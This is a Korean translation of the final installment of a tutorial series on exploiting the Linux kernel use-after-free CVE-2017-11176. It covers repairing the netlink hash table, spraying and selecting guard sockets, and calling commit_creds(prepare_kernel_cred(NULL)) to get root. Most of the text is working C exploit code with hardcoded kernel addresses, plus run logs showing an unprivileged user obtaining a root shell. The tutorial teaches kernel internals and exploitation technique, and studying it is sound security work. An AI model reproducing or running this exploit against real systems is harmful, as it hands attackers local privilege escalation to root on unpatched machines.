마지막엔 우리가 "guard" 요소를 설치하고 해제했다는 점을 고려하며 다음과 같이 해시 테이블을 fix할 수 있다:

1. *NETLINK\_SOCKET*의 해시 테이블을 얻는다.
2. *nl\_pid\_hashfn()* 해시 함수를 재생(replay)하여 타겟의 bucket 리스트를 얻는다.
3. 타겟을 찾을 때까지 "prev" 포인터를 저장하며 bucket 리스트를 순회한다.
4. 타겟의 "next" 포인터를 조사한다. 1024라면 첫 번째 시나리오인 것이므로 그냥 NULL로 재설정한다. 그렇지 않으면 guard 요소가 이미 fix했으므로 아무것도 하지 않는다.
5. 타겟의 "pprev" 필드를 fix한다.
6. *\_\_hlist\_del()* operation을 사용하여 bucket 리스트를 fix한다(이걸로 dangling pointer가 fix된다).
7. 순회를 멈춘다.

그럼 구현해보자:

```c
// kernel function symbols
#define NL_PID_HASHFN         ((void*) 0xffffffff814b6da0)
#define NETLINK_TABLE_GRAB    ((void*) 0xffffffff814b7ea0)
#define NETLINK_TABLE_UNGRAB  ((void*) 0xffffffff814b73e0)
#define NL_TABLE_ADDR         ((void*) 0xffffffff824528c0)

struct hlist_node {
  struct hlist_node *next, **pprev;
};

struct hlist_head {
  struct hlist_node *first;
};

struct nl_pid_hash {
  struct hlist_head* table;
  uint64_t rehash_time;
  uint32_t mask;
  uint32_t shift;
  uint32_t entries;
  uint32_t max_shift;
  uint32_t rnd;
};

struct netlink_table {
  struct nl_pid_hash hash;
  void* mc_list;
  void* listeners;
  uint32_t nl_nonroot;
  uint32_t groups;
  void* cb_mutex;
  void* module;
  uint32_t registered;
};

typedef void (*netlink_table_grab_func)(void);
typedef void (*netlink_table_ungrab_func)(void);
typedef struct hlist_head* (*nl_pid_hashfn_func)(struct nl_pid_hash *hash, uint32_t pid);

#define netlink_table_grab() \
  (((netlink_table_grab_func)(NETLINK_TABLE_GRAB))())
#define netlink_table_ungrab() \
  (((netlink_table_ungrab_func)(NETLINK_TABLE_UNGRAB))())
#define nl_pid_hashfn(hash, pid) \
 (((nl_pid_hashfn_func)(NL_PID_HASHFN))(hash, pid))

static void payload(void)
{
  struct task_struct *current = get_current(restored_rsp);
  struct socket *sock = current->files->fdt->fd[unblock_fd]->private_data;
  void *sk;

  sk = sock->sk; // keep it for list walking
  sock->sk = NULL; // fix the 'sk' dangling pointer

  // lock all hash tables
  netlink_table_grab();

  // retrieve NETLINK_USERSOCK's hash table
  struct netlink_table *nl_table = * (struct netlink_table**)NL_TABLE_ADDR; // deref it!
  struct nl_pid_hash *hash = &(nl_table[NETLINK_USERSOCK].hash);

  // retrieve the bucket list
  struct hlist_head *bucket = nl_pid_hashfn(hash, g_target.pid); // the original pid

  // walk the bucket list
  struct hlist_node *cur;
  struct hlist_node **pprev = &bucket->first;
  for (cur = bucket->first; cur; pprev = &cur->next, cur = cur->next)
  {
    // is this our target ?
    if (cur == (struct hlist_node*)sk)
    {
      // fix the 'next' and 'pprev' field
      if (cur->next == (struct hlist_node*)KMALLOC_TARGET) // 'cmsg_len' value (reallocation)
        cur->next = NULL; // first scenario: was the last element in the list
      cur->pprev = pprev;

      // __hlist_del() operation (dangling pointers fix up)
      *(cur->pprev) = cur->next;
      if (cur->next)
        cur->next->pprev = pprev;

      hash->entries--; // make it clean

      // stop walking
      break;
    }
  }

  // release the lock
  netlink_table_ungrab();
}
```

커널이 그런 것처럼 **operation 전체가** *netlink\_table\_grab()*과 *netlink\_table\_ungrab()*으로 **lock 상태에서 이루어졌다**는 점에 주목하자(?)! 그렇지 않으면 다른 스레드가 커널을 수정하려 하면 커널이 손상되게 할 것이다.

어쨌든 *그렇게까지* 끔찍하진 않았다 😊

잠깐! 위의 코드는 "guard" 요소를 설치했을 때만 작동한다. 그러니 어서 설치해보자!

#### Setting Up the Guard

위에서 말한 것처럼 guard를 설치하기 위해 spray같은 테크닉을 사용할 것이다. netlink socket을 잔뜩 생성하여 autobind하고, 해시 테이블을 스캔하여 잠재적으로 인접한 두 소켓을 "선택한다"는 발상이었다.

우선 소켓을 생성하고 autobind하는 *create\_netlnk\_candidate()* 함수를 만들자:

```c
struct sock_pid
{
  int sock_fd;
  uint32_t pid;
};

/*
 * Creates a NETLINK_USERSOCK netlink socket, binds it and retrieves its pid.
 * Argument @sp must not be NULL.
 *
 * Returns 0 on success, -1 on error.
 */

static int create_netlink_candidate(struct sock_pid *sp)
{
  struct sockaddr_nl addr = {
    .nl_family = AF_NETLINK,
    .nl_pad = 0,
    .nl_pid = 0, // zero to use netlink_autobind()
    .nl_groups = 0 // no groups

  };
  size_t addr_len = sizeof(addr);

  if ((sp->sock_fd = _socket(AF_NETLINK, SOCK_DGRAM, NETLINK_USERSOCK)) == -1)
  {
    perror("[-] socket");
    goto fail;
  }

  if (_bind(sp->sock_fd, (struct sockaddr*)&addr, sizeof(addr)) == -1)
  {
    perror("[-] bind");
    goto fail_close;
  }

  if (_getsockname(sp->sock_fd, &addr, &addr_len))
  {
    perror("[-] getsockname");
    goto fail_close;
  }

  sp->pid = addr.nl_pid;

  return 0;

fail_close:
  close(sp->sock_fd);
fail:
  sp->sock_fd = -1;
  sp->pid = -1;
  return -1;
}
```

그리고 */proc/net/netlink* file을 파싱해야 한다. 게다가 *parse\_proc\_net\_netlink()*는 (우리가 가지지 못한 것도 포함하여) **모든** netlink socket pid를 가진 *pids* 배열을 할당한다:

```c
/*
 * Parses @proto hash table from '/proc/net/netlink' and allocates/fills the
 * @pids array. The total numbers of pids matched is stored in @nb_pids.
 *
 * A typical output looks like:
 *
 *    $ cat /proc/net/netlink
 *    sk       Eth Pid    Groups   Rmem     Wmem     Dump     Locks     Drops
 *    ffff88001eb47800 0   0      00000000 0        0        (null) 2        0       
 *    ffff88001fa65800 6   0      00000000 0        0        (null) 2        0     
 *
 * Every line is printed from netlink_seq_show():
 *
 *    seq_printf(seq, "%p %-3d %-6d %08x %-8d %-8d %p %-8d %-8d\n"
 *
 * Returns 0 on success, -1 on error.
 */

static int parse_proc_net_netlink(int **pids, size_t *nb_pids, uint32_t proto)
{
  int proc_fd;
  char buf[4096];
  int ret;
  char *ptr;
  char *eol_token;
  size_t nb_bytes_read = 0;
  size_t tot_pids = 1024;

  *pids = NULL;
  *nb_pids = 0;

  if ((*pids = calloc(tot_pids, sizeof(**pids))) == NULL)
  {
    perror("[-] not enough memory");
    goto fail;
  }

  memset(buf, 0, sizeof(buf));
  if ((proc_fd = _open("/proc/net/netlink", O_RDONLY)) < 0)
  {
    perror("[-] open");
    goto fail;
  }

read_next_block:
  if ((ret = _read(proc_fd, buf, sizeof(buf))) < 0)
  {
    perror("[-] read");
    goto fail_close;
  }
  else if (ret == 0) // no more line to read
  {
    goto parsing_complete;
  }

  ptr = buf;

  if (strstr(ptr, "sk") != NULL) // this is the first line
  { 
    if ((eol_token = strstr(ptr, "\n")) == NULL)
    {
      // XXX: we don't handle this case, we can't even read one line...
      printf("[-] can't find end of first line\n");
      goto fail_close;
    }
    nb_bytes_read += eol_token - ptr + 1;
    ptr = eol_token + 1; // skip the first line
  }

parse_next_line:
  // this is a "normal" line
  if ((eol_token = strstr(ptr, "\n")) == NULL) // current line is incomplete
  {
    if (_lseek(proc_fd, nb_bytes_read, SEEK_SET) == -1)
    {
      perror("[-] lseek");
      goto fail_close;
    }
    goto read_next_block;
  }
  else
  {
    void *cur_addr;
    int cur_proto;
    int cur_pid;

    sscanf(ptr, "%p %d %d", &cur_addr, &cur_proto, &cur_pid);

    if (cur_proto == proto)
    {
      if (*nb_pids >= tot_pids) // current array is not big enough, make it grow
      {
        tot_pids *= 2;
        if ((*pids = realloc(*pids, tot_pids * sizeof(int))) == NULL)
        {
          printf("[-] not enough memory\n");
          goto fail_close;
        }
      }

      *(*pids + *nb_pids) = cur_pid;
      *nb_pids = *nb_pids + 1;
    }

    nb_bytes_read += eol_token - ptr + 1;
    ptr = eol_token + 1;
    goto parse_next_line;
  }

parsing_complete:
  close(proc_fd);
  return 0;

fail_close:
  close(proc_fd);
fail:
  if (*pids != NULL)
    free(*pids);
  *nb_pids = 0;
  return -1;
}
```

마지막으로 다음과 같은 일을 하는 *find\_netlink\_candidates()*를 통해 이것들을 연결한다:

1. netlink socket을 잔뜩 만든다(spray)
2. */proc/net/netlink* file을 파싱한다
3. 우리가 가진 소켓 중 연이은 소켓을 찾는다
4. 다른 netlink socket을 전부 해제한다(다음 섹션 참고)

```c
#define MAX_SOCK_PID_SPRAY 300

/*
 * Prepare multiple netlink sockets and search "adjacent" ones. Arguments
 * @target and @guard must not be NULL.
 *
 * Returns 0 on success, -1 on error.
 */

static int find_netlink_candidates(struct sock_pid *target, struct sock_pid *guard)
{
  struct sock_pid candidates[MAX_SOCK_PID_SPRAY];
  int *pids = NULL;
  size_t nb_pids;
  int i, j;
  int nb_owned;
  int ret = -1;

  target->sock_fd = -1;
  guard->sock_fd = -1;

  // allocate a bunch of netlink sockets
  for (i = 0; i < MAX_SOCK_PID_SPRAY; ++i)
  {
    if (create_netlink_candidate(&candidates[i]))
    { 
      printf("[-] failed to create a new candidate\n");
      goto release_candidates;
    }
  }
  printf("[+] %d candidates created\n", MAX_SOCK_PID_SPRAY);

  if (parse_proc_net_netlink(&pids, &nb_pids, NETLINK_USERSOCK))
  {
    printf("[-] failed to parse '/proc/net/netlink'\n");
    goto release_pids;
  }
  printf("[+] parsing '/proc/net/netlink' complete\n");

  // find two consecutives pid that we own (slow algorithm O(N*M))
  i = nb_pids;
  while (--i > 0)
  {
    guard->pid = pids[i];
    target->pid = pids[i - 1];
    nb_owned = 0;

    // the list is not ordered by pid, so we do a full walking
    for (j = 0; j < MAX_SOCK_PID_SPRAY; ++j) 
    {
      if (candidates[j].pid == guard->pid)
      {
        guard->sock_fd = candidates[j].sock_fd;
        nb_owned++;
      }
      else if (candidates[j].pid == target->pid)
      {
        target->sock_fd = candidates[j].sock_fd;
        nb_owned++;
      }

      if (nb_owned == 2)
        goto found;
    }

    // reset sock_fd to release them
    guard->sock_fd = -1;
    target->sock_fd = -1;
  }

  // we didn't found any valid candidates, release and quit
  goto release_pids;

found:
  printf("[+] adjacent candidates found!\n");
  ret = 0; // we succeed

release_pids:
  i = MAX_SOCK_PID_SPRAY; // reset the candidate counter for release
  if (pids != NULL)
    free(pids);

release_candidates:
  while (--i >= 0)
  {
    // do not release the target/guard sockets
    if ((candidates[i].sock_fd != target->sock_fd) &&
        (candidates[i].sock_fd != guard->sock_fd))
    {
      close(candidates[i].sock_fd);
    }
  }

  return ret;
} 
```

새 *create\_netlink\_candidate()* 함수 때문에 이전의 *prepare\_blocking\_socket()* 함수는 더이상 사용하지 않을 것이다. 그러나 여전히 타겟의 receiver buffer를 채워 타겟이 block되게 만들어야 한다. 게다가 채우는 데 "guard"를 사용할 것이다. 이것이 *fill\_receive\_buffer()*에 구현되어 있다:

```c
static int fill_receive_buffer(struct sock_pid *target, struct sock_pid *guard)
{
  char buf[1024*10];
  int new_size = 0; // this will be reset to SOCK_MIN_RCVBUF

  struct sockaddr_nl addr = {
    .nl_family = AF_NETLINK,
    .nl_pad = 0,
    .nl_pid = target->pid, // use the target's pid
    .nl_groups = 0 // no groups
  };

  struct iovec iov = {
    .iov_base = buf,
    .iov_len = sizeof(buf)
  };

  struct msghdr mhdr = {
    .msg_name = &addr,
    .msg_namelen = sizeof(addr),
    .msg_iov = &iov,
    .msg_iovlen = 1,
    .msg_control = NULL,
    .msg_controllen = 0,
    .msg_flags = 0, 
  };

  printf("[ ] preparing blocking netlink socket\n");

  if (_setsockopt(target->sock_fd, SOL_SOCKET, SO_RCVBUF, &new_size, sizeof(new_size)))
    perror("[-] setsockopt"); // no worry if it fails, it is just an optim.
  else
    printf("[+] receive buffer reduced\n");

  printf("[ ] flooding socket\n");
  while (_sendmsg(guard->sock_fd, &mhdr, MSG_DONTWAIT) > 0)
    ;
  if (errno != EAGAIN)
  {
    perror("[-] sendmsg");
    goto fail;
  }
  printf("[+] flood completed\n");

  printf("[+] blocking socket ready\n");

  return 0;

fail:
  printf("[-] failed to prepare blocking socket\n");
  return -1;
}
```

*main()* 함수가 *find\_netlink\_candidate()*를 재할당 초기화 이후 호출하도록 수정하자. 더이상 **sock\_fd**가 아닌 *g\_target.sock\_fd* 변수를 사용한다는 것을 기억하자. *g\_target*과 *g\_guard*는 전역으로 선언되어 *payload()*에서 사용할 수 있다. 또한, "시나리오 1"을 handle하기 위해 **재할당 이후 guard를 close하는 것**을 기억하자(guard는 타겟과 인접해 있다):

```c
static struct sock_pid g_target;
static struct sock_pid g_guard;

int main(void)
{
  // ... cut ...

  printf("[+] reallocation ready!\n");

  if (find_netlink_candidates(&g_target, &g_guard))
  {
    printf("[-] failed to find netlink candidates\n");
    goto fail;
  }
  printf("[+] netlink candidates ready:\n");
  printf("[+] target.pid = %d\n", g_target.pid);
  printf("[+] guard.pid  = %d\n", g_guard.pid);

  if (fill_receive_buffer(&g_target, &g_guard))
    goto fail;

  if (((unblock_fd = _dup(g_target.sock_fd)) < 0) ||
      ((sock_fd2 = _dup(g_target.sock_fd)) < 0))
  {
    perror("[-] dup");
    goto fail;
  }
  printf("[+] netlink fd duplicated (unblock_fd=%d, sock_fd2=%d)\n", unblock_fd, sock_fd2);

  // trigger the bug twice AND immediatly realloc!
  if (decrease_sock_refcounter(g_target.sock_fd, unblock_fd) ||
      decrease_sock_refcounter(sock_fd2, unblock_fd))
  {
    goto fail;
  }
  realloc_NOW();

  // close it before invoking the arbitrary call
  printf("[ ] closing guard socket\n");
  close(g_guard.sock_fd);                       // <----- !

  // ... cut ...
}
```

이제 크래시를 테스트해볼 시간이다!

```bash
$ ./exploit
[ ] -={ CVE-2017-11176 Exploit }=-
[+] successfully migrated to CPU#0
[+] userland structures allocated:
[+] g_uland_wq_elt = 0x120001000
[+] g_fake_stack   = 0x20001000
[+] ROP-chain ready
[ ] optmem_max = 20480
[+] can use the 'ancillary data buffer' reallocation gadget!
[+] g_uland_wq_elt.func = 0xffffffff8107b6b8
[+] reallocation data initialized!
[ ] initializing reallocation threads, please wait...
[+] 200 reallocation threads ready!
[+] reallocation ready!
[+] 300 candidates created
[+] parsing '/proc/net/netlink' complete
[+] adjacent candidates found!
[+] netlink candidates ready:
[+] target.pid = -5723
[+] guard.pid  = -5708
[ ] preparing blocking netlink socket
[+] receive buffer reduced
[ ] flooding socket
[+] flood completed
[+] blocking socket ready
[+] netlink fd duplicated (unblock_fd=403, sock_fd2=404)
[ ] creating unblock thread...
[+] unblocking thread has been created!
[ ] get ready to block
[ ][unblock] closing 468 fd
[ ][unblock] unblocking now
[+] mq_notify succeed
[ ] creating unblock thread...
[+] unblocking thread has been created!
[ ] get ready to block
[ ][unblock] closing 404 fd
[ ][unblock] unblocking now
[+] mq_notify succeed
[ ] closing guard socket
[ ] addr_len = 12
[ ] addr.nl_pid = 296082670
[ ] magic_pid = 296082670
[+] reallocation succeed! Have fun :-)
[ ] invoking arbitrary call primitive...
[+] arbitrary call succeed!
[+] exploit complete!
$ cat /proc/net/netlink                                                                                     
sk       Eth Pid    Groups   Rmem     Wmem     Dump     Locks     Drops
ffff88001eb47800 0   0      00000000 0        0        (null) 2        0       
ffff88001fa66800 6   0      00000000 0        0        (null) 2        0       
ffff88001966ac00 9   1125   00000000 0        0        (null) 2        0       
ffff88001a2a0800 9   0      00000000 0        0        (null) 2        0       
ffff88001e24f400 10  0      00000000 0        0        (null) 2        0       
ffff88001e0a2c00 11  0      00000000 0        0        (null) 2        0       
ffff88001f492c00 15  480    00000000 0        0        (null) 2        0       
ffff88001f492400 15  479    00000001 0        0        (null) 2        0       
ffff88001f58f800 15  -4154  00000000 0        0        (null) 2        0       
ffff88001eb47000 15  0      00000000 0        0        (null) 2        0       
ffff88001e0fe000 16  0      00000000 0        0        (null) 2        0       
ffff88001e0fe400 18  0      00000000 0        0        (null) 2        0       
ffff8800196bf800 31  1322   00000001 0        0        (null) 2        0       
ffff880019698000 31  0      00000000 0        0        (null) 2        0       
```

**유레카!**

**더이상 크래시가 발생하지 않는다!**

**커널이 보수되었다!**

**성공적인 익스플로잇이었다!**

**해냈다!**

후! 이제 숨을 쉴 수 있겠다.

우리가 "모든 것"을 고쳤고 어떤 dangling pointer나 다른 무언가를 잊지 않았기를 바란다. 완벽한 사람은 없다.

그럼 다음은 뭔가? 익스플로잇의 "profit" 단계로 넘어가기 전에, 돌아가서 왜 *find\_netlink\_candidates()*에서 netlink socket들을 해제했는지를 잠깐 설명해야겠다.

- - -

## Reliability

이전 섹션에서 언급한 것처럼, 우린 우리가 *find\_netlink\_candidates()*에서 netlink candidate들을 spray하고 해제한 사실을 넘어갔다. 이걸 하는 이유는 **익스플로잇 확실성을 늘리기** 위함이다.

(하드코딩된 오프셋이나 주소에 문제가 없다고 가정하고) 익스플로잇에서 뭐가 잘못될 수 있는지 나열해보자:

* 재할당 실패
* concurrent한 바이너리(혹은 커널 자체)가 타겟의 bucket 리스트를 순회하려 함

[part 3](https://chamalane.herokuapp.com/posts/5d503601c040080004228197)에서 말한 것처럼 재할당을 개선하는(improve) 것은 복잡한 주제다. 재할당 성공 확률을 높이는 방법을 찾으려면 메모리 하위 시스템을 자세하게 이해하고 있어야 한다. 우리가 part 3에서 했던 건 간단히 "heap spraying"과 CPU fixation을 조합한 것이다. "웬만하면" 작동하는 방법이지만, 개선의 여지가 남아있다. 다행히도 우리의 오브젝트는 *잘 쓰이지 않는* kmemcache인 *kmalloc-1024*에 있었다.

"Repair the Kernel" 섹션에서 타겟의 bucket 리스트가 두 경우에 순회될 수 있음을 보았다:

1. netlink socket이 타겟의 bucket과 **충돌하는** pid를 가지고 있을 때
2. **dilution**이 발생하여 커널이 모든 bucket 리스트를 순회할 때

두 경우 모두 커널을 보수하기 전까진 재할당 데이터의 첫 필드를 제어하기 못하기 때문에 (*next*의 값이 NULL이 아닌 값인 1024이다) NULL-deref가 발생할 것이다.

dilution과 충돌의 위험을 줄이기 위해 많은 netlink 소켓을 생성(그리고 autobind)했다. bucket이 많을수록 충돌이 적게 발생한다. Jenkins 해시 함수가 "균일한"(uniform) 값을 생산하여 삽입 도중의 충돌 확률이 "1 / (nb\_buckets)"와 같이 나오길 바랄 뿐이다.

**bucket이 256개 있으면 그런 충돌이 발생할 확률은 0.4%이다**. 이건 "수용할 수 있는" 확률이다.

다음은 "dilution"에 관한 것이다. dilution은 두 경우에 발생한다:

1. 해시 테이블이 커질 때
2. "꽉 찬"(charged) bucket에 삽입할 때(= 충돌)

2)는 이미 위에서 다뤘다.

1)을 해결하려면 많은 netlink socket을 할당하여 **해시 테이블이 미리(preemptively) 커지게** 만들어야 한다. 그리고 소켓을 (타겟과 guard 빼고) 전부 해제하여 거의 빈 테이블이 되어도 해시 테이블은 **절대 줄어들지 않는다**.

**즉 다른 프로그램이 의도적으로 다른 소켓을 잔뜩 생성하여 *NETLINK\_USERSOCK*을사용하고(자유롭게 다른 netlink 프로토콜을 사용할 수 있음) 그 소켓들이 전부 bind되어있지 않은 이상은 잘못될 일이 없다!** 확률은 어떻게 계산하냐고? 어떤 다른 프로그램이 돌아가고 있는지 모르기 때문에.. 이건 게임의 일부이다!

우린 활용도를 알아보기 위해 "/proc/net/netlink"를 사용할 수 있고, 익스플로잇을 실행할지 말지 선택할 수 있고, 몇몇 통계를 분석할 수 있는 등 여러가지를 할 수 있다.

다음 그림은 익스플로잇 과정에서 크래시를 일으킬 수 있는 "위험" 지도이다:

![Exploit Danger Map](https://blog.lexfo.fr/images/cve-2017-11176-linux/danger_map.png)

- - -

## Getting root

이제 여기서 해볼 것은 루트 권한을 획득하는 것이다.

동기(motivation)에 따라서, ring-3에서보단 ring-0에서 더 많은 것(container/vm/trustzone escape하기, 커널 패치하기, 메모리나 비밀 추출/스캔하기 등)을 할 수 있다. 하지만 사람들은 *강력한* #을 좋아한다... 🤭

우리의 "낮은 권한의"(unprivileged) 사용자의 관점에서 보면 이건 권한 확대(privilege escalation)이다. 반대로 이제 ring-0에서 임의의 코드를 실행할 수 있다는 것을 고려했을 때 ring-3으로 돌아가는 것은 권한 축소(privilege de-escalation)이다.

리눅스에서 task의 권한은 누가 정의하는가? **struct cred**이다:

```c
struct cred {
    atomic_t    usage;
  // ... cut ...
    uid_t       uid;        /* real UID of the task */
    gid_t       gid;        /* real GID of the task */
    uid_t       suid;       /* saved UID of the task */
    gid_t       sgid;       /* saved GID of the task */
    uid_t       euid;       /* effective UID of the task */
    gid_t       egid;       /* effective GID of the task */
    uid_t       fsuid;      /* UID for VFS ops */
    gid_t       fsgid;      /* GID for VFS ops */
    unsigned    securebits; /* SUID-less security management */
    kernel_cap_t    cap_inheritable; /* caps our children can inherit */
    kernel_cap_t    cap_permitted;  /* caps we're permitted */
    kernel_cap_t    cap_effective;  /* caps we can actually use */
    kernel_cap_t    cap_bset;   /* capability bounding set */
  // ... cut ...
#ifdef CONFIG_SECURITY
    void        *security;  /* subjective LSM security */
#endif
  // ... cut ...
};
```

각각의 task(= *task\_struct*)에는 두 *struct cred*가 있다:

```c
struct task_struct {
  // ... cut ...
    const struct cred *real_cred;   /* objective and real subjective task credentials (COW) */
    const struct cred *cred;    /* effective (overridable) subjective task
  // ... cut ...
};
```

이미 **uid/gid**와 **euid/egid**가 익숙할 것이다. 놀랍게도 제일 중요한 것은 실제 기능(capabilities)이다! 다양한 시스템 콜(예: *chroot()*)을 보면 대부분이 **!capable(CAP\_SYS\_XXX)** 코드로 시작한다:

```c
SYSCALL_DEFINE1(chroot, const char __user *, filename)
{
  // ... cut ...

    error = -EPERM;
    if (!capable(CAP_SYS_CHROOT))
        goto dput_and_out;

  // ... cut ...
}
```

(유저 영역과는 다르게) 커널 코드에서 (*current->real->cred->uid ==0*)가 있는 코드는 거의(어쩌면 아예?) 보기 힘들 것이다. 다시 말해, 그저 자신의 *struct cred* id에 "0을 넣는 것"으로는 충분하지 않다(?).

덧붙여서 **security\_xxx()**라는 접두사로 시작하는 함수도 많이 볼 수 있다. 예를 들면:

```c
static inline int __sock_sendmsg(struct kiocb *iocb, struct socket *sock,
                 struct msghdr *msg, size_t size)
{
    int err = security_socket_sendmsg(sock, msg, size);

    return err ?: __sock_sendmsg_nosec(iocb, sock, msg, size);
}
```

이런 종류의 함수는 **Linux Security Modules (LSM)**에서 나오며 *struct cred*의 *security* 필드를 사용한다. 잘 알려진 LSM으론 *SELinux*가 있따. LSM 주 용도는 접근 권한을 강화하는 것이다.

그럼 uid, capability, security와 같은 것들이 있는데, 뭘 해야 할까? 그냥 **struct cred 전체를** 패치하면 될까? 그럴 수도 있지만 더 나은 방법이 있다. *task\_struct*의 *real\_cread*와 *cred* 포인터 바꾸기? 정답에 가까워지고 있다.

이 포인터들을 수동으로 "덮어씌울" 때 발생하는 문제는 어떤 값으로 덮어씌우냐는 것이다. 루트의 task를 스캔하여 그 값을 사용할까? 아니다! ***struct cred*엔 레퍼런스 카운터가 있다!** 그렇게 하면 참조를 하지 않고 레퍼런스 카운터를 두 번 감소시키는 것이다(아이러니하게도 우리의 bug와 비슷하다).

사실 이 모든 레퍼런스 카운트 housekeeping을 해주는 함수가 있다:

```c
int commit_creds(struct cred *new)
{
    struct task_struct *task = current;
    const struct cred *old = task->real_cred;

  // ... cut ...

    get_cred(new);      // <---- take a reference

  // ... cut ...

    rcu_assign_pointer(task->real_cred, new);
    rcu_assign_pointer(task->cred, new);

  // ... cut ...

    /* release the old obj and subj refs both */
    put_cred(old);      // <----- release previous references
    put_cred(old);
    return 0;
}
```

훌륭하다. 하지만 파라미터에 유효한 *struct cred*가 필요하다. 그럼 이제 commit\_creds()의 친구 **prepare\_kernel\_cred()**를 만나볼 시간이다:

```c
struct cred *prepare_kernel_cred(struct task_struct *daemon)
{
    const struct cred *old;
    struct cred *new;

    new = kmem_cache_alloc(cred_jar, GFP_KERNEL);
    if (!new)
        return NULL;

    if (daemon)
        old = get_task_cred(daemon);
    else
        old = get_cred(&init_cred);     // <----- THIS!

    validate_creds(old);

    *new = *old;                      // <----- copy all fields

  // ... cut ...
}
```

기본적으로 *prepare\_kernel\_cred()*가 하는 일은 새 *struct cred*를 할당하여 현재 것으로부터 채우는 것이다(?). **그러나 파라미터가 NULL이면** (동일하게(also) "루트"에서 실행되는) 시스템에서 가장 권한이 높은 프로세스인 ***init* 프로세스의 cred를 복사할 것이다**!

이해했다면 이걸 호출하기만 하면 된다:

```c
commit_cred(prepare_kernel_cred(NULL));
```

이게 전부다! 게다가 이전의 *struct cred*를 깔끔하게 해제해준다. 익스플로잇을 업데이트하자:

```c
#define COMMIT_CREDS          ((void*) 0xffffffff810b8ee0)
#define PREPARE_KERNEL_CRED   ((void*) 0xffffffff810b90c0)

typedef int (*commit_creds_func)(void *new);
typedef void* (*prepare_kernel_cred_func)(void *daemon);

#define commit_creds(cred) \
  (((commit_creds_func)(COMMIT_CREDS))(cred))
#define prepare_kernel_cred(daemon) \
  (((prepare_kernel_cred_func)(PREPARE_KERNEL_CRED))(daemon))

static void payload(void)
{
  // ... cut ...

  // release the lock
  netlink_table_ungrab();

  // privilege (de-)escalation
  commit_creds(prepare_kernel_cred(NULL));
}
```

그리고 "popping shell" 코드를 넣는다:

```c
int main(void)
{
  // ... cut ...

  printf("[+] exploit complete!\n");

  printf("[ ] popping shell now!\n");
    char* shell = "/bin/bash";
    char* args[] = {shell, "-i", NULL};
    execve(shell, args, NULL);

  return 0;

fail:
  printf("[-] exploit failed!\n");
  PRESS_KEY();
  return -1;
}
```

그럼 다음과 같은 결과를 얻는다:

```bash
[user@localhost tmp]$ id; ./exploit
uid=1000(user) gid=1000(user) groups=1000(user)
[ ] -={ CVE-2017-11176 Exploit }=-
[+] successfully migrated to CPU#0
...
[+] arbitrary call succeed!
[+] exploit complete!
[ ] popping shell now!
[root@localhost tmp]# id
uid=0(root) gid=0(root) groups=0(root)
```

이제 정말 끝났다! 우리가 **ring-0 arbitrary code execution**을 가졌단 것을 기억하자. 이것은 "루트"보다 권한이 높은 것이다. 현명하게 사용하고 즐겨라 😆!

- - -

## Conclusion

**축하한다. 해냈다!**

우선 여기까지 왔다는 것에 감사를 표하고 싶다. 첫 커널 익스플로잇을 작성하는 것은 많은 사람들을 좌절시키는 벅찬 일이다. 한번에 많은 것들을 이해해야 하고, 인내심과 호전성(pugnacity)이 있어야 한다.

게다가 우린 *use-after-free* (메모리 충돌 버그)를 익스플로잇하는 "어려운 길"을 선택했다. 찾아보면 적은 양의 코드로 된 짧은 익스플로잇들이 있다. 심지어 그중에는 10줄이 안 되는 것도 있다! 이들은 제일 좋은 종류의 버그(타겟이 없고, 확실하고, 빠른 등)로 여겨지는 "logical bug"를 익스플로잇한다. 그럼에도 불구하고 그들은 굉장히 구체적이며 여기서 본 것처럼 많은 하위 시스템을 접할 수 없다.

*use-after-free*는 이 글을 쓰는 시점(2018)에도 여전히 흔히 보인다. uaf는 퍼저를 이용하거나 직접 코드 리뷰를 하여 발견하기가 거의 어렵다. 특히 우리가 익스플로잇한 버그는 **한 줄이 없어서** 존재하는 버그였다. 게다가 *race condition*에서 트리거되기 때문에 발견하기가 더 어려웠다.

이 시리즈에서 다음 리눅스 커널 하위 시스템 중 표면만을 건드렸다 (출처: makelinux.net):

![Linux Kernel Map](https://blog.lexfo.fr/images/cve-2017-11176-linux/kernel_map.jpg)

이제 여기 써있는 용어에 좀 더 친숙해졌길 바란다. 보면 알겠지만 아직 한참 멀었다...😅

그럼 우리가 한 걸 요약해보자.

[part 1](https://chamalane.herokuapp.com/posts/5d4ef9fb907a8600042c4cca)에서 "virtual file system"의 기본적인 내용(file이 무엇인가? FDT는? VFT는?)과 레퍼런스 카운트 facility에 대해 소개했다. 공개된 정보(CVE 설명, 패치)를 연구하여 버그를 더 잘 이해하고 공격 시나리오를 만들 수 있었다. 그리고 그것을 SystemTap(아주 유용한 툴!)을 이용하여 커널 영역에서 구현했다.

[part 2](https://chamalane.herokuapp.com/posts/5d4ef9fb907a8600042c4cca)에서 "스케쥴러 하위 시스템"과 "wait queue"에 대해 더 구체적으로 소개했다. 이를 이해하여 race condition을 이길 수 있었다. 여러 커널 코드 경로를 세심하게 분석하여 syscall을 조정하고 유저 영역의 코드로 *proof-of-concept*을 만들 수 있었다. 여기서 첫 커널 크래시가 발생했다.

[part 3](https://chamalane.herokuapp.com/posts/5d503601c040080004228197)에서 "메모리 하위 시스템"을 소개하고 SLAB allocator에 초점을 맞추었는데, 이는 대부분의 use-after-free 그리고/혹은 heap overflow 버그를 익스플로잇하는 데 꼭 필요한 것이었다. UAF를 익스플로잇하는 데 필요한 모든 정보를 자세히 분석한 후에, type confusion을 이용해 arbitrary call primitive를 얻고 netlink socket의 wait queue가 유저 영역을 가리키게 만들 방법을 찾았다. 게다가 잘 알려진 재할당 가젯 ancillary data buffer를 이용하여 재할당을 구현했다.

이번 마지막 파트에서 우린 x86-64와 관련된 많은 "low-level"이며 "아키텍처에 따라 다른" 것들(커널 스택, 가상 메모리 레이아웃, thread\_info)을 보았다. arbitrary code execution을 얻기 위해 하드웨어 보안 기능인 SMEP를 hit했다. x86-64에서 접근 권한이 결정되는 방식과 page fault 예외 trace를 이해하여, 그것을 우회할 익스플로잇 전략(ROP-chain으로 무력화시키기)을 설계했다.

커널을 보수해야 했기 때문에 arbitrary execution을 얻는 것은 부분적인 성공이었다. socket dangling pointer를 고치는 게 간단했던 데 반해 해시 리스트를 고치는 데는 netlink 코드(구조체, 알고리즘, procfs)를 잘 이해하여 극복한 어려움들이 있었다. 마지막엔 두 커널 함수만을 호출하여 루트 쉘을 얻었고 익스플로잇의 약점(확실성)을 분석했다.

- - -

## Going Further

다음으론 뭘 해야 하는가?

